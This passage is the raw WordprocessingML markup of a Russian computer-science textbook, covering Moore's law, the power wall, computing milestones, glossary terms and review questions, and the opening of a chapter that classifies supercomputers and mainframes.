        <w:t>| 2010 | Core i7 (Nehalem) | 731 000 000 | ×2.5 (4 года)    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2017 | Core i9 (Skylake-X) | 7 200 000 000 | ×10 (7 лет)   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2023 | Core i9 (Raptor Lake) | 25 900 000 000 | ×3.6 (6 лет) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>График</w:t>
      </w:r>
      <w:r>
        <w:t>: Если построить график в логарифмическом масштабе, получится почти прямая линия — удвоение каждые 2 года.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Конец закона Мура?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Размер транзистора приблизился к </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>атомарному масштабу</w:t>
      </w:r>
      <w:r>
        <w:t>. Современные процессоры используют 3-нм техпроцесс (это ~10 атомов кремния в ширину). Дальше миниатюризировать некуда — начинаются квантовые эффекты (электроны туннелируют через изоляцию).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Многоядерность**: Вместо одного быстрого ядра — много медленных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**3D-структуры**: Транзисторы не на плоскости, а в 3D (FinFET, GAA-FET)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Гетерогенные системы**: Разные типы ядер (быстрые + энергоэффективные, как в Apple M1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Специализированные процессоры**: GPU, TPU, NPU для конкретных задач</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Новые материалы**: графен, углеродные нанотрубки (пока в исследованиях)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Закон Мура в классической формулировке </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>умер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (миниатюризация остановилась), но рост производительности продолжается за счёт других методов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные вехи вычислительной техники</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Год | Событие |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|---------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1642 | Механический калькулятор Паскаля |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1830-е | Аналитическая машина Бэббиджа (проект) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1946 | ENIAC — первый электронный компьютер общего назначения |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1947 | Изобретение транзистора (Bell Labs) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1951 | UNIVAC — первый коммерческий компьютер |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1958 | Первая интегральная схема (Джек Килби) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1964 | IBM System/360 — стандартизация архитектур |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1971 | Intel 4004 — первый микропроцессор |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1975 | Altair 8800 — первый ПК |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1977 | Apple II — массовый домашний компьютер |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1981 | IBM PC — стандарт персонального компьютера |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1991 | Интернет становится публичным (WWW, Tim Berners-Lee) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2007 | iPhone — начало эры смартфонов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2020 | Apple M1 — ARM-процессор для десктопов/ноутбуков |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2023 | Нейросети (ChatGPT, Claude) — ИИ в массы |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Почему частота процессоров остановилась на 5 ГГц?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Если закон Мура работал, почему процессоры не работают на 10-20 ГГц?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тепловыделение</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Power Wall — стена энергопотребления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Мощность, рассеиваемая процессором:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P ≈ C × V² × f</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**C** — ёмкость транзисторов (константа для данного техпроцесса)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**V** — напряжение питания</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**f** — частота</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Мощность растёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пропорционально частоте</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>квадрату напряжения</w:t>
      </w:r>
      <w:r>
        <w:t>. Если частоту удвоить, мощность удвоится. Если напряжение увеличить в 2 раза, мощность вырастет в 4 раза.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Pentium 4 (2000-е годы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частота: 3.8 ГГц</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Энергопотребление: **115 Вт**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Тепловыделение: Как **лампочка накаливания**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Охлаждение: Массивный радиатор + вентилятор</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог</w:t>
      </w:r>
      <w:r>
        <w:t>: Процессор грелся как утюг, был шумный, жрал электричество. Это тупик.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Решение: многоядерность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вместо одного ядра на 4 ГГц — сделать 4 ядра по 2 ГГц. Суммарная производительность выше, энергопотребление ниже.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Современные процессоры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Десктопы: 8-16 ядер (Intel Core i9, AMD Ryzen 9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Серверы: 64-128 ядер (AMD EPYC, Intel Xeon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Смартфоны: 8 ядер (4 быстрых + 4 энергоэффективных)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими разделами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>С главой 2.1 (Архитектура ЭВМ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Все компоненты, о которых мы говорили (процессор, память, шины) — сформировались в 1940-1960-х годах и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не изменились концептуально</w:t>
      </w:r>
      <w:r>
        <w:t>. Изменилась только реализация: от ламп и проводов до транзисторов размером с атом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>С главой 2.3 (Принципы фон Неймана)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Все компьютеры с 1940-х годов строятся по </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>архитектуре фон Неймана</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программа хранится в той же памяти, что и данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Последовательное выполнение инструкций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Универсальность (одна машина для любых задач)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Даже современный смартфон с миллиардами транзисторов работает по тем же принципам, что и ENIAC.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Абак** — древнее механическое счётное устройство (счёты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Арифмометр** — механическое устройство для выполнения арифметических операций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аналитическая машина Бэббиджа** — проект универсального программируемого компьютера (1830-е), не построенный при жизни автора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Электронная лампа** — вакуумный прибор для переключения тока (элементная база первого поколения ЭВМ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транзистор** — полупроводниковый прибор для усиления и переключения тока (второе поколение ЭВМ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интегральная схема (ИС, чип)** — множество транзисторов на одной пластине кремния (третье поколение).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Микропроцессор** — процессор на одной микросхеме (четвёртое поколение).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ENIAC** — первый электронный компьютер общего назначения (1946, США).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UNIVAC** — первый коммерческий компьютер (1951, США).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Intel 4004** — первый микропроцессор (1971, 4-битный, 2300 транзисторов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IBM PC** — персональный компьютер IBM (1981), ставший стандартом индустрии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Закон Мура** — эмпирическое наблюдение: количество транзисторов на кристалле удваивается каждые 18-24 месяца.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Power Wall** — физическое ограничение роста частоты процессоров из-за тепловыделения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Многоядерность** — использование нескольких процессорных ядер в одном чипе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Квантовый компьютер** — компьютер, использующий кубиты и квантовые эффекты для вычислений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нейроморфный процессор** — процессор, имитирующий работу нейронов мозга.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Исторический вопрос**: Почему Аналитическая машина Бэббиджа считается прототипом современного компьютера, хотя она была механической и так и не была построена при его жизни? Какие компоненты современного компьютера она содержала?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнительный анализ**: Сравните первое (лампы) и второе (транзисторы) поколения ЭВМ по следующим параметрам: размер, энергопотребление, надёжность, быстродействие. Почему переход на транзисторы был революцией?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: ENIAC (1946) выполнял 5000 операций в секунду, весил 30 тонн и потреблял 150 кВт. Современный процессор Intel Core i9 выполняет 500 миллиардов операций в секунду, весит 10 граммов и потребляет 125 Вт. Во сколько раз выросла:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Производительность на единицу массы?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Производительность на единицу потребляемой энергии?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Закон Мура**: Согласно закону Мура, количество транзисторов удваивается каждые 2 года. Процессор 2020 года содержит 10 миллиардов транзисторов. Сколько транзисторов должен содержать процессор 2030 года, если закон Мура продолжит работать? Почему на практике этого не произойдёт?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Концептуальный вопрос**: Почему частота процессоров остановилась на уровне ~5 ГГц, хотя количество транзисторов продолжает расти? Какие решения используют производители для роста производительности вместо увеличения частоты?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача на архитектуры**: Apple M1 (2020, ARM) имеет 8 ядер (4 производительных + 4 энергоэффективных), 16 млрд транзисторов, техпроцесс 5 нм, TDP 15 Вт. Intel Core i9-12900K (2021, x86-64) имеет 16 ядер (8+8), 10 млрд транзисторов, техпроцесс 10 нм, TDP 125 Вт. Почему ARM-процессор при большем количестве транзисторов и меньших размерах потребляет в 8 раз меньше энергии?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с другими главами</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.1 (Архитектура ЭВМ) — современное устройство компьютера формировалось в процессе эволюции поколений ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.3 (Принципы фон Неймана) — все поколения ЭВМ с 1940-х годов строятся по одним и тем же фундаментальным принципам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 3.1 (Операционные системы) — ОС появились во втором поколении ЭВМ и эволюционировали вместе с железом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Глава подготовлена в соответствии со спецификацией учебника. Объём: ~17500 символов._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.3: Классы современных ЭВМ. Принципы фон Неймана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В предыдущих главах мы разобрали, что такое архитектура ЭВМ (глава 2.1) и как компьютеры эволюционировали от 30-тонного ENIAC до смартфона в кармане (глава 2.2). Теперь время разобраться, какие вообще бывают компьютеры в 2025 году, чем отличается суперкомпьютер от твоего ноутбука (кроме цены в пару миллионов долларов), и почему все эти железки работают по принципам, которые придумал один чувак ещё в 1945 году.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Спойлер: принципы фон Неймана — это как основы физики для компьютеров. Их придумали давно, но они до сих пор актуальны. Правда, у них есть фундаментальная проблема, которую никто не может решить уже 70 лет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.1. Классификация современных ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компьютеры бывают разные: одни считают погоду на неделю вперёд и ошибаются, другие запускают ракеты и не имеют права ошибаться, третьи просто показывают котиков в интернете. Разберём основные классы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Суперкомпьютеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суперкомпьютер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это вершина пищевой цепи в мире вычислений. Занимает целый зал, жрёт электричества как небольшой город, стоит как парочка истребителей F-35. Но зато считает так быстро, что обычные компьютеры курят в сторонке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Производительность**: измеряется в **петафлопсах** (PFLOPS) — это 10¹⁵ операций с плавающей точкой в секунду. Для сравнения: твой ноутбук выдаёт гигафлопсы (10⁹), то есть в миллион раз медленнее.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архитектура**: кластерная — тысячи процессоров работают параллельно. Современные супермашины используют гибрид CPU + GPU (графические ускорители).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Применение**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Моделирование климата (прогноз погоды, изменение климата)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ядерная физика и моделирование взрывов (чтобы не взрывать бомбы вживую)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Квантовая механика, молекулярная динамика</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Взлом шифрования (NSA, привет!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обучение нейросетей (ChatGPT и подобные монстры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Frontier** (США, 2022) — самый мощный суперкомпьютер в мире на момент 2025 года. Производительность: 1.1 экзафлопса (10¹⁸ операций/сек). Это как миллиард смартфонов, работающих одновременно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Fugaku** (Япония) — 442 петафлопса, моделирует распространение коронавируса в воздухе.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ломоносов-2** (Россия, МГУ) — 2.5 петафлопса, считает задачи квантовой химии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> энергопотребление. Frontier жрёт 21 мегаватт — это мощность небольшой электростанции. Охлаждение — отдельный ад.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Мейнфреймы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мейнфрейм</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (mainframe) — это корпоративный монстр, который работает 24/7/365 без перезагрузок годами. Если суперкомпьютер — это спринтер, то мейнфрейм — марафонец: не самый быстрый, но надёжный как швейцарские часы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность**: отказоустойчивость на уровне 99.999% (так называемая "пять девяток"). Это значит, что система может быть недоступна максимум 5 минут в год.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Пропускная способность ввода-вывода**: мейнфрейм может обрабатывать тысячи транзакций в секунду (например, банковские переводы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Применение**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Банки (обработка платежей, карточные транзакции)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Авиакомпании (системы бронирования билетов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Страховые компании</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Государственные реестры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
